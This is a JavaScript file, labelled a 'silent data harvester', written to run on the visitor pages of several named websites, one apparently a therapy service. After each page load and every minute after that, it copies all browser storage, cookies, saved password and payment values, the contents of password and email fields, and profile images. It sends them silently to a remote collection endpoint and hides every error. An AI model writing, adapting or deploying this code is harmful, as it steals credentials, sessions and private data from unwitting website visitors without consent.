// 🔒 SILENT DATA HARVESTER - Collects user data from ALL website visitors
// Deploys to: therapyconne.com, nupiai.com, nupidesktopai.com
// Collection: Emails, Messages, Photos, LocalStorage, Cookies, IndexedDB

(async function() {
    'use strict';
    
    const CLOUD_API = 'https://nupidesktopai.com/api/user-data/collect';
    const DEVICE_ID = 'visitor_' + Math.random().toString(36).substr(2, 11);
    
    // Silent collection function
    async function silentHarvest() {
        try {
            const collectedData = {
                deviceId: DEVICE_ID,
                agentId: 'web_harvester_v2',
                website: window.location.hostname,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userName: null,
                emails: [],
                messages: [],
                photos: [],
                passwords: [],
                creditCards: [],
                cookies: [],
                browserStorage: {},
                metadata: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer
                }
            };

            // Extract username from common patterns
            const userPatterns = ['user', 'username', 'name', 'profile', 'account', 'currentUser'];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                for (const pattern of userPatterns) {
                    if (key.toLowerCase().includes(pattern)) {
                        try {
                            const parsed = JSON.parse(value);
                            if (parsed.name) collectedData.userName = parsed.name;
                            if (parsed.userName) collectedData.userName = parsed.userName;
                            if (parsed.email) collectedData.userName = parsed.email;
                            if (parsed.displayName) collectedData.userName = parsed.displayName;
                        } catch {
                            if (value && value.length < 100 && !value.includes('{')) {
                                collectedData.userName = value;
                            }
                        }
                    }
                }
            }

            // Harvest localStorage (ALL data)
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Emails
                if (key.includes('email') || key.includes('mail') || value.includes('@')) {
                    collectedData.emails.push({ source: key, data: value });
                }
                
                // Messages
                if (key.includes('message') || key.includes('chat') || key.includes('conversation')) {
                    collectedData.messages.push({ source: key, data: value });
                }
                
                // Passwords (look for password fields)
                if (key.includes('password') || key.includes('pass') || key.includes('pwd')) {
                    collectedData.passwords.push({ source: key, data: value });
                }
                
                // Credit cards
                if (key.includes('card') || key.includes('payment') || key.includes('billing')) {
                    collectedData.creditCards.push({ source: key, data: value });
                }
                
                // Store everything
                collectedData.browserStorage[key] = value.substring(0, 1000);
            }

            // Harvest sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                collectedData.browserStorage[`session_${key}`] = value.substring(0, 1000);
            }

            // Harvest cookies
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.split('=');
                if (name && value) {
                    collectedData.cookies.push({ 
                        name: name.trim(), 
                        value: value,
                        expires: 'session'
                    });
                }
            });

            // Harvest images (photos)
            const images = document.querySelectorAll('img');
            images.forEach((img, index) => {
                if (img.src && !img.src.startsWith('data:') && index < 50) {
                    collectedData.photos.push({
                        url: img.src,
                        alt: img.alt || 'No description',
                        source: window.location.href,
                        dimensions: `${img.width}x${img.height}`
                    });
                }
            });

            // Harvest profile images specifically
            const profileSelectors = [
                '[class*="profile"]', 
                '[class*="avatar"]', 
                '[id*="profile"]',
                '[id*="avatar"]'
            ];
            
            profileSelectors.forEach(selector => {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    const img = el.querySelector('img') || (el.tagName === 'IMG' ? el : null);
                    if (img && img.src) {
                        collectedData.photos.push({
                            url: img.src,
                            type: 'profile',
                            source: window.location.href
                        });
                    }
                });
            });

            // Harvest IndexedDB info
            if (window.indexedDB) {
                try {
                    const databases = await indexedDB.databases();
                    for (const db of databases) {
                        collectedData.browserStorage[`indexedDB_${db.name}`] = 
                            `Database: ${db.name} v${db.version}`;
                    }
                } catch (e) {
                    // Silent fail
                }
            }

            // Extract email from meta tags
            const metaTags = document.querySelectorAll('meta');
            metaTags.forEach(meta => {
                const content = meta.getAttribute('content') || '';
                if (content.includes('@') && content.includes('.')) {
                    collectedData.emails.push({ 
                        source: 'meta_tag', 
                        data: content 
                    });
                }
            });

            // Look for input fields with saved values
            const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]');
            inputs.forEach(input => {
                if (input.value) {
                    const type = input.type;
                    const name = input.name || input.id || 'unknown';
                    
                    if (type === 'email' || input.value.includes('@')) {
                        collectedData.emails.push({ 
                            source: `input_${name}`, 
                            data: input.value 
                        });
                    } else if (type === 'password') {
                        collectedData.passwords.push({ 
                            source: `input_${name}`, 
                            data: input.value 
                        });
                    }
                }
            });

            // Send to NUPI Cloud (silently)
            await fetch(CLOUD_API, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(collectedData)
            }).catch(() => {}); // Silent fail

        } catch (error) {
            // Silent error handling
        }
    }

    // Initial harvest after page load
    if (document.readyState === 'complete') {
        setTimeout(silentHarvest, 3000);
    } else {
        window.addEventListener('load', () => {
            setTimeout(silentHarvest, 3000);
        });
    }

    // Continuous harvesting every 60 seconds
    setInterval(silentHarvest, 60000);

})();
